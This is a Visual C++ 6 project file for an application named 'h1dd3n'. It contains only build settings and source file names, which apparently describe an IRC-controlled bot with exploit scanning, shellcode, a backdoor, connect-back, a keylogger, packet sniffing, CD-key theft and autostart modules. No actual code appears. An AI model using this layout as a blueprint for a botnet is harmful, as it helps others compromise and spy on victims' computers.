# Microsoft Developer Studio Project File - Name="h1dd3n" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=h1dd3n - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "fukj00.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "fukj00.mak" CFG="h1dd3n - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "h1dd3n - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "h1dd3n - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

BSC32=bscmake.exe
LINK32=link.exe

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MTd /W3 /Gi /GX /Od /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32  /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32  /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib  kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 /nologo /subsystem:windows /profile /map /debug /machine:I386

!ENDIF 

# Begin Target

# Name "h1dd3n - Win32 Release"
# Name "h1dd3n - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Core"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\autostart.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\crc32.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\crypt.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\ehandler.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\fukj00.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\irc_send.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\loaddlls.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\netutils.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rndnick.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\shellcode.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\threads.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\wildcard.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# End Group
# Begin Group "Scanning"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\advscan.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\scan.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# End Group
# Begin Group "Exploits"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\asn.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# End Group
# Begin Group "Servers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\backdoor.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\connback.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\ftpd.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\httpd.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\ident.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\redirect.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\session.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\tftpd.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# End Group
# Begin Group "Sniffing"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\keylogger.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\psniff.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\sniffer.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# End Group
# Begin Group "Misc"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\aliaslog.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\capture.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\cdkeys.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\dcc.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\download.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\driveinfo.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\findfile.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\fphost.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\misc.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\net.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\patcher.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\processes.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\remotecmd.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\secure.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\sysinfo.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\version.c

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\visit.cpp

!IF  "$(CFG)" == "h1dd3n - Win32 Release"

!ELSEIF  "$(CFG)" == "h1dd3n - Win32 Debug"

!ENDIF 

# End Source File
# End Group
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Configuration"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\configs.h
# End Source File
# Begin Source File

SOURCE=.\defines.h
# End Source File
# End Group
# Begin Group "Others"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\advscan.h
# End Source File
# Begin Source File

SOURCE=.\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\asn.h
# End Source File
# Begin Source File

SOURCE=.\autostart.h
# End Source File
# Begin Source File

SOURCE=.\backdoor.h
# End Source File
# Begin Source File

SOURCE=.\capture.h
# End Source File
# Begin Source File

SOURCE=.\cdkeys.h
# End Source File
# Begin Source File

SOURCE=.\connback.h
# End Source File
# Begin Source File

SOURCE=.\crc32.h
# End Source File
# Begin Source File

SOURCE=.\crypt.h
# End Source File
# Begin Source File

SOURCE=.\dcc.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\externs.h
# End Source File
# Begin Source File

SOURCE=.\findfile.h
# End Source File
# Begin Source File

SOURCE=.\fphost.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\fukj00.h
# End Source File
# Begin Source File

SOURCE=.\functions.h
# End Source File
# Begin Source File

SOURCE=.\globals.h
# End Source File
# Begin Source File

SOURCE=.\httpd.h
# End Source File
# Begin Source File

SOURCE=.\ident.h
# End Source File
# Begin Source File

SOURCE=.\includes.h
# End Source File
# Begin Source File

SOURCE=.\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\misc.h
# End Source File
# Begin Source File

SOURCE=.\net.h
# End Source File
# Begin Source File

SOURCE=.\netutils.h
# End Source File
# Begin Source File

SOURCE=.\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\passwd.h
# End Source File
# Begin Source File

SOURCE=.\patcher.h
# End Source File
# Begin Source File

SOURCE=.\pingudp.h
# End Source File
# Begin Source File

SOURCE=.\processes.h
# End Source File
# Begin Source File

SOURCE=.\psniff.h
# End Source File
# Begin Source File

SOURCE=.\redirect.h
# End Source File
# Begin Source File

SOURCE=.\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\scan.h
# End Source File
# Begin Source File

SOURCE=.\secure.h
# End Source File
# Begin Source File

SOURCE=.\session.h
# End Source File
# Begin Source File

SOURCE=.\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\sniffer.h
# End Source File
# Begin Source File

SOURCE=.\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\version.h
# End Source File
# Begin Source File

SOURCE=.\visit.h
# End Source File
# Begin Source File

SOURCE=.\wildcard.h
# End Source File
# End Group
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
